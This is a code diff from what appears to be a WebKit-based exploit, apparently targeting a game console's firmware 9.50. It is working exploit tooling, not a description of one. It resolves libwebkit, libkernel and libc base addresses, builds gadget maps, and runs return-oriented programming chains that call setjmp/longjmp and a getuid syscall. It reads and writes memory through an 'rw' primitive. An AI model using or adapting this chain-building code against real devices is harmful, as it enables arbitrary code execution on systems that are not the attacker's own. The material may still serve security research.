@@ -555,7 +555,7 @@ class Chain950 extends Chain950Base {
 }
 const Chain = Chain950;
 
-function init(Chain) {
+/*function init(Chain) {
     [libwebkit_base, libkernel_base, libc_base] = get_bases();
 
     init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
@@ -598,6 +598,132 @@ function test_rop(Chain) {
     chain.run()
     alert('returned successfully');
     debug_log('returned successfully');
+    debug_log('jmp_buf:');
+    debug_log(jmp_buf);
+    debug_log(`flag: ${rw.read64(chain.flag, 0)}`);
+
+    const state1 = new Uint8Array(8);
+    debug_log('test if rax == 0');
+    chain.clean();
+
+    chain.push_gadget('pop rsi; ret');
+    chain.push_value(get_view_vector(state1));
+    chain.push_save();
+    chain.push_gadget('pop rax; ret');
+    chain.push_constant(0);
+
+    chain.start_branch();
+    chain.push_restore();
+
+    chain.push_gadget('pop rcx; ret');
+    chain.push_constant(1);
+    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+    chain.push_end();
+
+    chain.end_branch();
+
+    chain.push_restore(true);
+    chain.push_gadget('pop rcx; ret');
+    chain.push_constant(2);
+    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+    chain.push_end();
+
+    chain.run();
+    debug_log(`state1 must be 1: ${state1}`);
+    if (state1[0] !== 1) {
+        die('if branch not taken');
+    }
+
+    const state2 = new Uint8Array(8);
+    debug_log('test if rax != 0');
+    chain.clean();
+
+    chain.push_gadget('pop rsi; ret');
+    chain.push_value(get_view_vector(state2));
+    chain.push_save();
+    chain.push_gadget('pop rax; ret');
+    chain.push_constant(1);
+
+    chain.start_branch();
+    chain.push_restore();
+
+    chain.push_gadget('pop rcx; ret');
+    chain.push_constant(1);
+    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+    chain.push_end();
+
+    chain.end_branch();
+
+    chain.push_restore(true);
+    chain.push_gadget('pop rcx; ret');
+    chain.push_constant(2);
+    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+    chain.push_end();
+
+    chain.run();
+    debug_log(`state2 must be 2: ${state2}`);
+    if (state2[0] !== 2) {
+        die('if branch taken');
+    }
+
+    debug_log('test syscall getuid()');
+    chain.clean();
+    // Set the return value to some random value. If the syscall worked, then
+    // it will likely change.
+    const magic = 0x4b4355467;
+    rw.write32(chain._return_value, 0, magic);
+
+    const res = chain.syscall('getuid');
+
+    debug_log(`return value: ${res}`);
+    if (res.eq(magic)) {
+        die('syscall getuid failed');
+    }
+}*/
+
+function init(Chain) {
+    [libwebkit_base, libkernel_base, libc_base] = get_bases();
+
+    init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
+    init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
+    init_syscall_array(syscall_array, libkernel_base, 300 * KB);
+    debug_log('syscall_array:');
+    debug_log(syscall_array);
+    Chain.init_class(gadgets, syscall_array);
+}
+
+function test_rop(Chain) {
+    const jmp_buf = new Uint8Array(jmp_buf_size);
+    const jmp_buf_p = get_view_vector(jmp_buf);
+
+    init(Chain);
+
+    setjmp_addr = gadgets.get('setjmp');
+    longjmp_addr = gadgets.get('longjmp');
+
+    const chain = new Chain();
+    // Instead of writing to the jmp_buf, set rax here so it will be restored
+    // as the return value after the longjmp().
+    chain.push_gadget('pop rax; ret');
+    chain.push_constant(1);
+    chain.push_call(setjmp_addr, jmp_buf_p);
+
+    chain.start_branch();
+
+    debug_log(`if chain addr: ${chain.stack_addr.add(chain.position)}`);
+    chain.push_call(longjmp_addr, jmp_buf_p);
+
+    chain.end_branch();
+
+    debug_log(`endif chain addr: ${chain.stack_addr.add(chain.position)}`);
+    chain.push_end();
+
+    // The ROP chain is a noop. If we crashed, then we did something wrong.
+    //alert('ROP chain');
+    debug_log('test call setjmp()/longjmp()');
+    chain.run()
+    alert('ROP chain returned successfully');
+    debug_log('ROP chain returned successfully');
     debug_log('jmp_buf:');
     debug_log(jmp_buf);
     debug_log(`flag: ${rw.read64(chain.flag, 0)}`);
